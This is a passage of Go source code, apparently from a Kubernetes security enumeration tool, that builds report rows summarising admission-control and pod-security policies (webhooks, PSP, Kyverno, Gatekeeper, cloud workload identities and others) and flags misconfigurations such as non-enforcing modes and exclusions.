			policyExceptionsStr = strings.Join(policyExceptions, ", ")
		}

		outputRows = append(outputRows, []string{
			finding.Namespace,
			pssEnforce,
			pssWarn,
			pssAudit,
			pspEnabled,
			privilegedAllowed,
			hostPathAllowed,
			hostNetworkAllowed,
			hostPIDAllowed,
			dangerousCaps,
			fmt.Sprintf("%d", finding.WebhookCount),
			webhookBypass,
			policyEnginesStr,
			policyExceptionsStr,
			finding.Age,
		})

		// Generate loot content
		generatePolicyLoot(&finding, loot)
	}

	// Generate webhook detail rows
	// Generate webhook detail rows - Uniform schema: Namespace | Name | Scope | Target | Type | Configuration | Details | Issues
	for _, wh := range mutatingWebhooks {
		// Type
		policyType := "MutatingWebhook"

		// Configuration
		configStr := fmt.Sprintf("Failure: %s, Timeout: %ds", wh.FailurePolicy, wh.TimeoutSeconds)

		// Details
		sideEffects := wh.SideEffects
		if sideEffects == "" {
			sideEffects = "Unknown"
		}
		details := fmt.Sprintf("SideEffects: %s", sideEffects)
		if wh.HasExclusions {
			details += ", Has exclusions"
		}

		// Detect issues
		var whIssues []string
		if wh.FailurePolicy == "Ignore" {
			whIssues = append(whIssues, "Failure policy Ignore (bypassable)")
		}
		if wh.HasExclusions {
			whIssues = append(whIssues, "Has namespace exclusions")
		}
		if wh.SideEffects == "Unknown" || wh.SideEffects == "Some" {
			whIssues = append(whIssues, "Side effects not None")
		}
		if wh.TimeoutSeconds > 10 {
			whIssues = append(whIssues, "Long timeout")
		}
		whIssuesStr := "<NONE>"
		if len(whIssues) > 0 {
			whIssuesStr = strings.Join(whIssues, "; ")
		}

		webhookRows = append(webhookRows, []string{
			"<CLUSTER>",
			wh.Name,
			"Cluster",
			"All pods",
			policyType,
			configStr,
			details,
			whIssuesStr,
		})
	}

	for _, wh := range validatingWebhooks {
		// Type
		policyType := "ValidatingWebhook"

		// Configuration
		configStr := fmt.Sprintf("Failure: %s, Timeout: %ds", wh.FailurePolicy, wh.TimeoutSeconds)

		// Details
		sideEffects := wh.SideEffects
		if sideEffects == "" {
			sideEffects = "Unknown"
		}
		details := fmt.Sprintf("SideEffects: %s", sideEffects)
		if wh.HasExclusions {
			details += ", Has exclusions"
		}

		// Detect issues
		var whIssues []string
		if wh.FailurePolicy == "Ignore" {
			whIssues = append(whIssues, "Failure policy Ignore (bypassable)")
		}
		if wh.HasExclusions {
			whIssues = append(whIssues, "Has namespace exclusions")
		}
		if wh.SideEffects == "Unknown" || wh.SideEffects == "Some" {
			whIssues = append(whIssues, "Side effects not None")
		}
		if wh.TimeoutSeconds > 10 {
			whIssues = append(whIssues, "Long timeout")
		}
		whIssuesStr := "<NONE>"
		if len(whIssues) > 0 {
			whIssuesStr = strings.Join(whIssues, "; ")
		}

		webhookRows = append(webhookRows, []string{
			"<CLUSTER>",
			wh.Name,
			"Cluster",
			"All pods",
			policyType,
			configStr,
			details,
			whIssuesStr,
		})
	}

	// Generate PSP detail rows - Uniform schema: Namespace | Name | Scope | Target | Type | Configuration | Details | Issues
	for _, psp := range pspAnalyses {
		// Type
		policyType := "PodSecurityPolicy"

		// Configuration
		var config []string
		if psp.AllowsPrivileged {
			config = append(config, "Privileged: yes")
		}
		if psp.AllowsHostNetwork {
			config = append(config, "HostNetwork: yes")
		}
		if psp.AllowsHostPID {
			config = append(config, "HostPID: yes")
		}
		configStr := strings.Join(config, ", ")
		if configStr == "" {
			configStr = "Restricted"
		}

		// Details
		var detailParts []string
		if psp.AllowsHostIPC {
			detailParts = append(detailParts, "HostIPC: yes")
		}
		if psp.AllowsHostPath {
			if len(psp.AllowedHostPaths) > 0 {
				detailParts = append(detailParts, fmt.Sprintf("HostPaths: %s", strings.Join(psp.AllowedHostPaths, ", ")))
			} else {
				detailParts = append(detailParts, "HostPath: any")
			}
		}
		if len(psp.AllowedCapabilities) > 0 {
			detailParts = append(detailParts, fmt.Sprintf("Caps: %s", strings.Join(psp.AllowedCapabilities, ", ")))
		}
		if psp.AllowsRunAsRoot {
			detailParts = append(detailParts, "RunAsRoot: yes")
		}
		details := strings.Join(detailParts, ", ")
		if details == "" {
			details = "-"
		}

		// Detect issues
		var pspIssues []string
		if psp.AllowsPrivileged {
			pspIssues = append(pspIssues, "Allows privileged")
		}
		if psp.AllowsHostNetwork {
			pspIssues = append(pspIssues, "Allows hostNetwork")
		}
		if psp.AllowsHostPID {
			pspIssues = append(pspIssues, "Allows hostPID")
		}
		if psp.AllowsHostIPC {
			pspIssues = append(pspIssues, "Allows hostIPC")
		}
		if psp.AllowsHostPath {
			pspIssues = append(pspIssues, "Allows hostPath")
		}
		if len(psp.AllowedCapabilities) > 0 {
			pspIssues = append(pspIssues, "Dangerous capabilities")
		}
		if psp.AllowsRunAsRoot {
			pspIssues = append(pspIssues, "Allows runAsRoot")
		}
		pspIssuesStr := "<NONE>"
		if len(pspIssues) > 0 {
			pspIssuesStr = strings.Join(pspIssues, "; ")
		}

		pspRows = append(pspRows, []string{
			"<CLUSTER>",
			psp.Name,
			"Cluster",
			"All pods",
			policyType,
			configStr,
			details,
			pspIssuesStr,
		})
	}

	// Generate VAP detail rows - Uniform schema: Namespace | Name | Scope | Target | Type | Configuration | Details | Issues
	for _, vap := range vapPolicies {
		// Type
		policyType := "ValidatingAdmissionPolicy"

		// Configuration
		failurePolicy := vap.FailurePolicy
		if failurePolicy == "" {
			failurePolicy = "Fail"
		}
		configStr := fmt.Sprintf("Failure: %s, Validations: %d", failurePolicy, vap.Validations)

		// Details
		var detailParts []string
		if vap.ParamKind != "" {
			detailParts = append(detailParts, fmt.Sprintf("ParamKind: %s", vap.ParamKind))
		}
		if len(vap.Bindings) > 0 {
			detailParts = append(detailParts, fmt.Sprintf("Bindings: %s", strings.Join(vap.Bindings, ", ")))
		}
		details := strings.Join(detailParts, ", ")
		if details == "" {
			details = "-"
		}

		// Detect issues
		var vapIssues []string
		if failurePolicy == "Ignore" {
			vapIssues = append(vapIssues, "Failure policy Ignore")
		}
		if vap.Validations == 0 {
			vapIssues = append(vapIssues, "No validations defined")
		}
		if len(vap.Bindings) == 0 {
			vapIssues = append(vapIssues, "No bindings")
		}
		vapIssuesStr := "<NONE>"
		if len(vapIssues) > 0 {
			vapIssuesStr = strings.Join(vapIssues, "; ")
		}

		vapRows = append(vapRows, []string{
			"<CLUSTER>",
			vap.Name,
			"Cluster",
			"All pods",
			policyType,
			configStr,
			details,
			vapIssuesStr,
		})
	}

	// Generate Gatekeeper detail rows - Uniform schema: Namespace | Name | Scope | Target | Type | Configuration | Details | Issues
	for _, constraint := range gatekeeperConstraints {
		// Type
		policyType := constraint.Kind

		// Configuration
		configStr := fmt.Sprintf("Enforcement: %s", constraint.EnforcementAction)

		// Details
		matchStr := constraint.Match
		if matchStr == "" {
			matchStr = "All"
		}
		details := fmt.Sprintf("Match: %s", matchStr)
		if constraint.Violations > 0 {
			details += fmt.Sprintf(", Violations: %d", constraint.Violations)
		}

		// Detect issues
		var gkIssues []string
		if constraint.EnforcementAction == "dryrun" || constraint.EnforcementAction == "warn" {
			gkIssues = append(gkIssues, "Not enforcing ("+constraint.EnforcementAction+")")
		}
		if constraint.Violations > 0 {
			gkIssues = append(gkIssues, fmt.Sprintf("%d violations", constraint.Violations))
		}
		gkIssuesStr := "<NONE>"
		if len(gkIssues) > 0 {
			gkIssuesStr = strings.Join(gkIssues, "; ")
		}

		gatekeeperRows = append(gatekeeperRows, []string{
			"<CLUSTER>",
			constraint.Name,
			"Cluster",
			"All pods",
			policyType,
			configStr,
			details,
			gkIssuesStr,
		})
	}

	// Generate Kyverno policy detail rows - Uniform schema: Namespace | Name | Scope | Target | Type | Configuration | Details | Issues
	for _, policy := range kyvernoPolicies {
		scope := "Cluster"
		ns := "<CLUSTER>"
		policyType := "ClusterPolicy"
		if !policy.IsClusterPolicy {
			scope = "Namespace"
			ns = policy.Namespace
			policyType = "Policy"
		}

		failureAction := policy.ValidationFailure
		if failureAction == "" {
			failureAction = "Audit"
		}

		// Configuration
		configStr := fmt.Sprintf("Failure: %s, Rules: %d", failureAction, policy.Rules)

		// Details
		details := "-"
		if policy.Background {
			details = "Background: enabled"
		} else {
			details = "Background: disabled"
		}

		// Detect issues
		var kyIssues []string
		if failureAction == "Audit" {
			kyIssues = append(kyIssues, "Audit mode (not enforcing)")
		}
		if policy.Rules == 0 {
			kyIssues = append(kyIssues, "No rules defined")
		}
		if !policy.Background {
			kyIssues = append(kyIssues, "Background processing disabled")
		}
		kyIssuesStr := "<NONE>"
		if len(kyIssues) > 0 {
			kyIssuesStr = strings.Join(kyIssues, "; ")
		}

		kyvernoRows = append(kyvernoRows, []string{
			ns,
			policy.Name,
			scope,
			"All pods",
			policyType,
			configStr,
			details,
			kyIssuesStr,
		})
	}

	// Generate Kyverno exception detail rows (bypass vectors!) - Uniform schema: Namespace | Name | Scope | Target | Type | Configuration | Details | Issues
	for _, exception := range kyvernoExceptions {
		// Type
		policyType := "PolicyException"

		// Configuration
		policiesStr := "-"
		if len(exception.Policies) > 0 {
			policiesStr = strings.Join(exception.Policies, ", ")
		}
		configStr := fmt.Sprintf("Exempts: %s", policiesStr)

		// Details
		var detailParts []string
		if len(exception.Rules) > 0 {
			detailParts = append(detailParts, fmt.Sprintf("Rules: %s", strings.Join(exception.Rules, ", ")))
		}
		if exception.Match != "" {
			detailParts = append(detailParts, fmt.Sprintf("Match: %s", exception.Match))
		}
		details := strings.Join(detailParts, ", ")
		if details == "" {
			details = "-"
		}

		// Detect issues (all exceptions are potential bypass vectors)
		var exIssues []string
		exIssues = append(exIssues, "Policy bypass vector")
		if len(exception.Policies) > 1 {
			exIssues = append(exIssues, fmt.Sprintf("Exempts %d policies", len(exception.Policies)))
		}
		exIssuesStr := strings.Join(exIssues, "; ")

		kyvernoExceptionRows = append(kyvernoExceptionRows, []string{
			exception.Namespace,
			exception.Name,
			"Namespace",
			"Matching pods",
			policyType,
			configStr,
			details,
			exIssuesStr,
		})
	}

	// Generate Kubewarden detail rows - Uniform schema: Namespace | Name | Scope | Target | Type | Configuration | Details | Issues
	for _, policy := range kubewardenPolicies {
		scope := "Cluster"
		ns := "<CLUSTER>"
		policyType := "ClusterAdmissionPolicy"
		if !policy.IsClusterPolicy {
			scope = "Namespace"
			ns = policy.Namespace
			policyType = "AdmissionPolicy"
		}

		// Configuration
		configStr := fmt.Sprintf("Mode: %s, Mutating: %s", policy.Mode, shared.FormatBool(policy.Mutating))

		// Details
		module := policy.Module
		if module == "" {
			module = "<NONE>"
		}
		if len(module) > 40 {
			module = module[:40] + "..."
		}
		details := fmt.Sprintf("Module: %s", module)
		if policy.Rules != "" {
			details += fmt.Sprintf(", Rules: %s", policy.Rules)
		}

		// Detect issues
		var kwIssues []string
		if policy.Mode == "monitor" {
			kwIssues = append(kwIssues, "Monitor mode (not enforcing)")
		}
		if policy.Module == "" {
			kwIssues = append(kwIssues, "No module specified")
		}
		kwIssuesStr := "<NONE>"
		if len(kwIssues) > 0 {
			kwIssuesStr = strings.Join(kwIssues, "; ")
		}

		kubewardenRows = append(kubewardenRows, []string{
			ns,
			policy.Name,
			scope,
			"All pods",
			policyType,
			configStr,
			details,
			kwIssuesStr,
		})
	}

	// Generate jsPolicy detail rows - Uniform schema: Namespace | Name | Scope | Target | Type | Configuration | Details | Issues
	for _, policy := range jsPolicies {
		scope := "Cluster"
		ns := "<CLUSTER>"
		if !policy.IsClusterPolicy {
			scope = "Namespace"
			ns = policy.Namespace
		}

		// Type
		policyType := policy.Type
		if policyType == "" {
			policyType = "JsPolicy"
		}

		// Configuration
		violationPolicy := policy.ViolationPolicy
		if violationPolicy == "" {
			violationPolicy = "deny"
		}
		configStr := fmt.Sprintf("ViolationPolicy: %s", violationPolicy)

		// Details
		var detailParts []string
		if len(policy.Operations) > 0 {
			detailParts = append(detailParts, fmt.Sprintf("Ops: %s", strings.Join(policy.Operations, ", ")))
		}
		if len(policy.Resources) > 0 {
			detailParts = append(detailParts, fmt.Sprintf("Resources: %s", strings.Join(policy.Resources, ", ")))
		}
		details := strings.Join(detailParts, ", ")
		if details == "" {
			details = "-"
		}

		// Detect issues
		var jsIssues []string
		if violationPolicy != "deny" {
			jsIssues = append(jsIssues, "Not enforcing ("+violationPolicy+")")
		}
		if len(policy.Operations) == 0 {
			jsIssues = append(jsIssues, "No operations defined")
		}
		if len(policy.Resources) == 0 {
			jsIssues = append(jsIssues, "No resources defined")
		}
		jsIssuesStr := "<NONE>"
		if len(jsIssues) > 0 {
			jsIssuesStr = strings.Join(jsIssues, "; ")
		}

		jsPolicyRows = append(jsPolicyRows, []string{
			ns,
			policy.Name,
			scope,
			"All pods",
			policyType,
			configStr,
			details,
			jsIssuesStr,
		})
	}

	// Generate Gatekeeper exclusion rows (bypass vectors!) - Uniform schema: Namespace | Name | Scope | Target | Type | Configuration | Details | Issues
	for _, excludedNs := range gatekeeperConfig.ExcludedNamespaces {
		// All exclusions are potential bypass vectors
		gatekeeperExclusionRows = append(gatekeeperExclusionRows, []string{
			excludedNs,
			"GatekeeperExclusion",
			"Namespace",
			excludedNs,
			"NamespaceExclusion",
			"Config.spec.match.excludedNamespaces",
			"Namespace excluded from Gatekeeper",
			"Policy bypass vector",
		})
	}

	// Generate Polaris detail rows - Uniform schema: Namespace | Name | Scope | Target | Type | Configuration | Details | Issues
	if polarisConfig.WebhookEnabled || polarisConfig.ConfigMap != "" {
		// Type
		policyType := "PolarisConfig"

		// Configuration
		var config []string
		config = append(config, fmt.Sprintf("Webhook: %s", shared.FormatBool(polarisConfig.WebhookEnabled)))
		config = append(config, fmt.Sprintf("Checks: %d", polarisConfig.Checks))
		configStr := strings.Join(config, ", ")

		// Details
		var detailParts []string
		detailParts = append(detailParts, fmt.Sprintf("Privileged: %s", shared.FormatBool(polarisConfig.PrivilegedCheckEnabled)))
		detailParts = append(detailParts, fmt.Sprintf("HostNetwork: %s", shared.FormatBool(polarisConfig.HostNetworkCheckEnabled)))
		detailParts = append(detailParts, fmt.Sprintf("HostPID: %s", shared.FormatBool(polarisConfig.HostPIDCheckEnabled)))
		detailParts = append(detailParts, fmt.Sprintf("RunAsRoot: %s", shared.FormatBool(polarisConfig.RunAsRootCheckEnabled)))
		details := strings.Join(detailParts, ", ")

		var polarisIssues []string
		if !polarisConfig.WebhookEnabled {
			polarisIssues = append(polarisIssues, "Webhook disabled")
		}
		if !polarisConfig.PrivilegedCheckEnabled {
			polarisIssues = append(polarisIssues, "Privileged check disabled")
		}
		if !polarisConfig.HostNetworkCheckEnabled {
			polarisIssues = append(polarisIssues, "HostNetwork check disabled")
		}
		if !polarisConfig.HostPIDCheckEnabled {
			polarisIssues = append(polarisIssues, "HostPID check disabled")
		}
		if !polarisConfig.RunAsRootCheckEnabled {
			polarisIssues = append(polarisIssues, "RunAsRoot check disabled")
		}
		if polarisConfig.Exemptions > 0 {
			polarisIssues = append(polarisIssues, fmt.Sprintf("%d exemptions configured", polarisConfig.Exemptions))
		}
		issuesStr := "<NONE>"
		if len(polarisIssues) > 0 {
			issuesStr = strings.Join(polarisIssues, "; ")
		}
		polarisRows = append(polarisRows, []string{
			polarisConfig.Namespace,
			polarisConfig.ConfigMap,
			"Cluster",
			"All pods",
			policyType,
			configStr,
			details,
			issuesStr,
		})
	}

	// Generate Datree detail rows - Uniform schema: Namespace | Name | Scope | Target | Type | Configuration | Details | Issues
	if datreeConfig.WebhookEnabled {
		// Type
		policyType := "DatreeConfig"

		// Configuration
		configStr := fmt.Sprintf("Webhook: %s", shared.FormatBool(datreeConfig.WebhookEnabled))

		// Details
		var detailParts []string
		detailParts = append(detailParts, fmt.Sprintf("Privileged: %s", shared.FormatBool(datreeConfig.PrivilegedCheckEnabled)))
		detailParts = append(detailParts, fmt.Sprintf("HostNetwork: %s", shared.FormatBool(datreeConfig.HostNetworkCheckEnabled)))
		detailParts = append(detailParts, fmt.Sprintf("HostPID: %s", shared.FormatBool(datreeConfig.HostPIDCheckEnabled)))
		detailParts = append(detailParts, fmt.Sprintf("RunAsRoot: %s", shared.FormatBool(datreeConfig.RunAsRootCheckEnabled)))
		details := strings.Join(detailParts, ", ")

		var datreeIssues []string
		if !datreeConfig.PrivilegedCheckEnabled {
			datreeIssues = append(datreeIssues, "Privileged check disabled")
		}
		if !datreeConfig.HostNetworkCheckEnabled {
			datreeIssues = append(datreeIssues, "HostNetwork check disabled")
		}
		if !datreeConfig.HostPIDCheckEnabled {
			datreeIssues = append(datreeIssues, "HostPID check disabled")
		}
		if !datreeConfig.RunAsRootCheckEnabled {
			datreeIssues = append(datreeIssues, "RunAsRoot check disabled")
		}
		issuesStr := "<NONE>"
		if len(datreeIssues) > 0 {
			issuesStr = strings.Join(datreeIssues, "; ")
		}
		datreeRows = append(datreeRows, []string{
			"<CLUSTER>",
			datreeConfig.WebhookName,
			"Cluster",
			"All pods",
			policyType,
			configStr,
			details,
			issuesStr,
		})
	}

	// Generate AWS Pod Identity detail rows - Uniform schema: Namespace | Name | Scope | Target | Type | Configuration | Details | Issues
	for _, identity := range awsPodIdentities {
		// Type
		policyType := "PodIdentityAssociation"

		// Configuration
		configStr := fmt.Sprintf("SA: %s", identity.ServiceAccount)
		if identity.HasWildcard {
			configStr += ", Wildcard: yes"
		}

		// Details
		details := fmt.Sprintf("Role: %s", identity.RoleARN)

		var awsIssues []string
		if identity.HasWildcard {
			awsIssues = append(awsIssues, "Wildcard SA binding (overly permissive)")
		}
		if strings.Contains(identity.RoleARN, ":role/Admin") || strings.Contains(identity.RoleARN, "AdministratorAccess") {
			awsIssues = append(awsIssues, "Admin role attached")
		}
		issuesStr := "<NONE>"
		if len(awsIssues) > 0 {
			issuesStr = strings.Join(awsIssues, "; ")
		}
		awsPodIdentityRows = append(awsPodIdentityRows, []string{
			identity.Namespace,
			identity.Name,
			"Namespace",
			identity.ServiceAccount,
			policyType,
			configStr,
			details,
			issuesStr,
		})
	}

	// Generate GCP Workload Identity detail rows - Uniform schema: Namespace | Name | Scope | Target | Type | Configuration | Details | Issues
	for _, identity := range gcpWorkloadIdentities {
		// Type
		policyType := "WorkloadIdentity"

		// Configuration
		configStr := fmt.Sprintf("KSA: %s", identity.KSAName)
		if identity.AnnotationPresent {
			configStr += ", Annotation: present"
		}

		// Details
		details := fmt.Sprintf("GSA: %s", identity.GSAEmail)

		var gcpIssues []string
		if !identity.AnnotationPresent {
			gcpIssues = append(gcpIssues, "Missing annotation")
		}
		if strings.Contains(identity.GSAEmail, "owner") || strings.Contains(identity.GSAEmail, "admin") {
			gcpIssues = append(gcpIssues, "Privileged SA detected")
		}
		issuesStr := "<NONE>"
		if len(gcpIssues) > 0 {
			issuesStr = strings.Join(gcpIssues, "; ")
		}
		gcpWorkloadIdentityRows = append(gcpWorkloadIdentityRows, []string{
			identity.Namespace,
			identity.Name,
			"Namespace",
			identity.KSAName,
			policyType,
			configStr,
			details,
			issuesStr,
		})
	}

	// Generate Azure Workload Identity detail rows - Uniform schema: Namespace | Name | Scope | Target | Type | Configuration | Details | Issues
	for _, identity := range azureWorkloadIdentities {
		// Type
		policyType := identity.Kind

		// Configuration
		configStr := fmt.Sprintf("Selector: %s", identity.Selector)
		if identity.HasFederated {
			configStr += ", Federated: yes"
		}

		// Details
		details := fmt.Sprintf("ClientID: %s, TenantID: %s", identity.ClientID, identity.TenantID)

		var azureIssues []string
		if !identity.HasFederated {
			azureIssues = append(azureIssues, "Using legacy AAD Pod Identity")
		}
		if identity.Selector == "" || identity.Selector == "*" {
			azureIssues = append(azureIssues, "Broad selector (overly permissive)")
		}
		issuesStr := "<NONE>"
		if len(azureIssues) > 0 {
			issuesStr = strings.Join(azureIssues, "; ")
		}
		azureWorkloadIdentityRows = append(azureWorkloadIdentityRows, []string{
			identity.Namespace,
			identity.Name,
			"Namespace",
			identity.Selector,
			policyType,
			configStr,
			details,
			issuesStr,
		})
	}

	// Generate Capsule Tenant Pod Policy detail rows - Uniform schema: Namespace | Name | Scope | Target | Type | Configuration | Details | Issues
	for _, policy := range capsuleTenantPodPolicies {
		// Type
		policyType := "TenantPodPolicy"

		// Configuration
		pss := policy.PodSecurityStandard
		if pss == "" {
			pss = "none"
		}
		configStr := fmt.Sprintf("PSS: %s, Quotas: %s, Limits: %s",
			pss,
			shared.FormatBool(policy.HasResourceQuotas),
			shared.FormatBool(policy.HasLimitRanges))

		// Details
		var detailParts []string
		if len(policy.AllowedRuntimeClasses) > 0 {
			detailParts = append(detailParts, fmt.Sprintf("RuntimeClasses: %s", strings.Join(policy.AllowedRuntimeClasses, ", ")))
		}
		if len(policy.AllowedPriorityClasses) > 0 {
			detailParts = append(detailParts, fmt.Sprintf("PriorityClasses: %s", strings.Join(policy.AllowedPriorityClasses, ", ")))
		}
		if len(policy.ContainerRegistries) > 0 {
			detailParts = append(detailParts, fmt.Sprintf("Registries: %s", strings.Join(policy.ContainerRegistries, ", ")))
		}
		details := strings.Join(detailParts, ", ")
		if details == "" {
			details = "-"
		}

		var capsuleIssues []string
		if policy.PodSecurityStandard == "" || policy.PodSecurityStandard == "privileged" {
			capsuleIssues = append(capsuleIssues, "No PSS or privileged level")
		}
		if !policy.HasResourceQuotas {
			capsuleIssues = append(capsuleIssues, "No resource quotas")
		}
		if !policy.HasLimitRanges {
			capsuleIssues = append(capsuleIssues, "No limit ranges")
		}
		if len(policy.ContainerRegistries) == 0 {
			capsuleIssues = append(capsuleIssues, "No registry restrictions")
		}
		issuesStr := "<NONE>"
		if len(capsuleIssues) > 0 {
			issuesStr = strings.Join(capsuleIssues, "; ")
		}

		capsuleTenantPodRows = append(capsuleTenantPodRows, []string{
			policy.Namespace,
			policy.TenantName,
			"Tenant",
			"Tenant pods",
			policyType,
			configStr,
			details,
			issuesStr,
		})
	}

	// Generate Rancher Project Pod Policy detail rows - Uniform schema: Namespace | Name | Scope | Target | Type | Configuration | Details | Issues
	for _, policy := range rancherProjectPodPolicies {
		// Type
		policyType := "ProjectPodPolicy"

		// Configuration
		configStr := fmt.Sprintf("PSP: %s, Limits: %s, Quota: %s",
			shared.FormatBool(policy.HasPodSecurityPolicy),
			shared.FormatBool(policy.ContainerResourceLimit),
			shared.FormatBool(policy.NamespaceResourceQuota))

		// Details
		pspTemplate := policy.PSPTemplateID
		if pspTemplate == "" {
			pspTemplate = "none"
		}
		details := fmt.Sprintf("PSP Template: %s, Project ID: %s", pspTemplate, policy.ProjectID)

		var rancherIssues []string
		if !policy.HasPodSecurityPolicy {
			rancherIssues = append(rancherIssues, "No PSP configured")
		}
		if !policy.ContainerResourceLimit {
			rancherIssues = append(rancherIssues, "No container resource limits")
		}
		if !policy.NamespaceResourceQuota {
			rancherIssues = append(rancherIssues, "No namespace resource quota")
		}
		issuesStr := "<NONE>"
		if len(rancherIssues) > 0 {
			issuesStr = strings.Join(rancherIssues, "; ")
		}

		rancherProjectPodRows = append(rancherProjectPodRows, []string{
			policy.Namespace,
			policy.ProjectName,
			"Project",
			"Project pods",
			policyType,
			configStr,
			details,
			issuesStr,
		})
	}

	// Build unified policies table (merging all per-tool policies)
	var unifiedPolicies []PodEnumeratedPolicy

	// Add PSS policies from findings
	for _, finding := range findings {
		if finding.PSSEnforceLevel != "" {
			configStr := fmt.Sprintf("Level: %s", finding.PSSEnforceLevel)
			details := "-"
			if finding.PSSEnforceVersion != "" {
				details = fmt.Sprintf("Version: %s", finding.PSSEnforceVersion)
			}
			issuesStr := "<NONE>"
			if finding.PSSEnforceLevel == "privileged" {
				issuesStr = "Privileged level (no restrictions)"
			}
			unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
				Namespace:     finding.Namespace,
				Tool:          "PSS",
				Name:          "pod-security.kubernetes.io/enforce",
				Scope:         "Namespace",
				Target:        "All pods",
				Type:          "Enforce",
				Configuration: configStr,
				Details:       details,
				Issues:        issuesStr,
			})
		}
		if finding.PSSWarnLevel != "" {
			configStr := fmt.Sprintf("Level: %s", finding.PSSWarnLevel)
			details := "-"
			if finding.PSSWarnVersion != "" {
				details = fmt.Sprintf("Version: %s", finding.PSSWarnVersion)
			}
			unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
				Namespace:     finding.Namespace,
				Tool:          "PSS",
				Name:          "pod-security.kubernetes.io/warn",
				Scope:         "Namespace",
				Target:        "All pods",
				Type:          "Warn",
				Configuration: configStr,
				Details:       details,
				Issues:        "<NONE>",
			})
		}
		if finding.PSSAuditLevel != "" {
			configStr := fmt.Sprintf("Level: %s", finding.PSSAuditLevel)
			details := "-"
			if finding.PSSAuditVersion != "" {
				details = fmt.Sprintf("Version: %s", finding.PSSAuditVersion)
			}
			unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
				Namespace:     finding.Namespace,
				Tool:          "PSS",
				Name:          "pod-security.kubernetes.io/audit",
				Scope:         "Namespace",
				Target:        "All pods",
				Type:          "Audit",
				Configuration: configStr,
				Details:       details,
				Issues:        "<NONE>",
			})
		}
	}

	// Add PSP policies
	for _, psp := range pspAnalyses {
		var config []string
		if psp.AllowsPrivileged {
			config = append(config, "Privileged")
		}
		if psp.AllowsHostNetwork {
			config = append(config, "HostNetwork")
		}
		if psp.AllowsHostPID {
			config = append(config, "HostPID")
		}
		configStr := strings.Join(config, ", ")
		if configStr == "" {
			configStr = "Restricted"
		}

		var detailParts []string
		if psp.AllowsHostPath {
			detailParts = append(detailParts, "HostPath")
		}
		if len(psp.AllowedCapabilities) > 0 {
			detailParts = append(detailParts, fmt.Sprintf("Caps: %s", strings.Join(psp.AllowedCapabilities, ",")))
		}
		details := strings.Join(detailParts, ", ")
		if details == "" {
			details = "-"
		}

		var issues []string
		if psp.AllowsPrivileged {
			issues = append(issues, "Allows privileged")
		}
		if psp.AllowsHostNetwork {
			issues = append(issues, "Allows hostNetwork")
		}
		issuesStr := "<NONE>"
		if len(issues) > 0 {
			issuesStr = strings.Join(issues, "; ")
		}

		unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
			Namespace:     "<CLUSTER>",
			Tool:          "PSP",
			Name:          psp.Name,
			Scope:         "Cluster",
			Target:        "All pods",
			Type:          "PodSecurityPolicy",
			Configuration: configStr,
			Details:       details,
			Issues:        issuesStr,
		})
	}

	// Add Webhook policies
	for _, wh := range mutatingWebhooks {
		configStr := fmt.Sprintf("Failure: %s, Timeout: %ds", wh.FailurePolicy, wh.TimeoutSeconds)
		details := fmt.Sprintf("SideEffects: %s", wh.SideEffects)
		issuesStr := "<NONE>"
		if wh.FailurePolicy == "Ignore" {
			issuesStr = "Failure policy Ignore (bypassable)"
		}
		unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
			Namespace:     "<CLUSTER>",
			Tool:          "Webhook",
			Name:          wh.Name,
			Scope:         "Cluster",
			Target:        "All pods",
			Type:          "Mutating",
			Configuration: configStr,
			Details:       details,
			Issues:        issuesStr,
		})
	}
	for _, wh := range validatingWebhooks {
		configStr := fmt.Sprintf("Failure: %s, Timeout: %ds", wh.FailurePolicy, wh.TimeoutSeconds)
		details := fmt.Sprintf("SideEffects: %s", wh.SideEffects)
		issuesStr := "<NONE>"
		if wh.FailurePolicy == "Ignore" {
			issuesStr = "Failure policy Ignore (bypassable)"
		}
		unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
			Namespace:     "<CLUSTER>",
			Tool:          "Webhook",
			Name:          wh.Name,
			Scope:         "Cluster",
			Target:        "All pods",
			Type:          "Validating",
			Configuration: configStr,
			Details:       details,
			Issues:        issuesStr,
		})
	}

	// Add VAP policies
	for _, vap := range vapPolicies {
		failurePolicy := vap.FailurePolicy
		if failurePolicy == "" {
			failurePolicy = "Fail"
		}
		configStr := fmt.Sprintf("Failure: %s, Validations: %d", failurePolicy, vap.Validations)
		details := "CEL-based validation"
		if vap.ParamKind != "" {
			details = fmt.Sprintf("ParamKind: %s", vap.ParamKind)
		}
		issuesStr := "<NONE>"
		if failurePolicy == "Ignore" {
			issuesStr = "Failure policy Ignore (bypassable)"
		}
		unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
			Namespace:     "<ALL>",
			Tool:          "VAP",
			Name:          vap.Name,
			Scope:         "Cluster",
			Target:        "Matched resources",
			Type:          "ValidatingAdmissionPolicy",
			Configuration: configStr,
			Details:       details,
			Issues:        issuesStr,
		})
	}

	// Add Gatekeeper constraints
	for _, constraint := range gatekeeperConstraints {
		configStr := fmt.Sprintf("Enforcement: %s", constraint.EnforcementAction)
		details := fmt.Sprintf("Kind: %s", constraint.Kind)
		if constraint.Violations > 0 {
			details += fmt.Sprintf(", Violations: %d", constraint.Violations)
		}
		issuesStr := "<NONE>"
		if constraint.EnforcementAction == "warn" || constraint.EnforcementAction == "dryrun" {
			issuesStr = fmt.Sprintf("Non-blocking enforcement (%s)", constraint.EnforcementAction)
		}
		if constraint.Violations > 0 {
			if issuesStr == "<NONE>" {
				issuesStr = fmt.Sprintf("%d violations", constraint.Violations)
			} else {
				issuesStr += fmt.Sprintf("; %d violations", constraint.Violations)
			}
		}
		unifiedPolicies = append(unifiedPolicies, PodEnumeratedPolicy{
			Namespace:     "<ALL>",
			Tool:          "Gatekeeper",
			Name:          constraint.Name,
			Scope:         "Cluster",
			Target:        "Matched resources",
			Type:          "Constraint",
			Configuration: configStr,
			Details:       details,
			Issues:        issuesStr,
		})
	}

	// Add Kyverno policies
	for _, policy := range kyvernoPolicies {
		scope := "Cluster"
		ns := "<ALL>"
		if !policy.IsClusterPolicy {
			scope = "Namespace"
			ns = policy.Namespace
		}
		failureAction := policy.ValidationFailure
		if failureAction == "" {
			failureAction = "Audit"
		}
		policyType := "ClusterPolicy"
		if !policy.IsClusterPolicy {
			policyType = "Policy"
		}
		configStr := fmt.Sprintf("FailureAction: %s, Rules: %d", failureAction, policy.Rules)
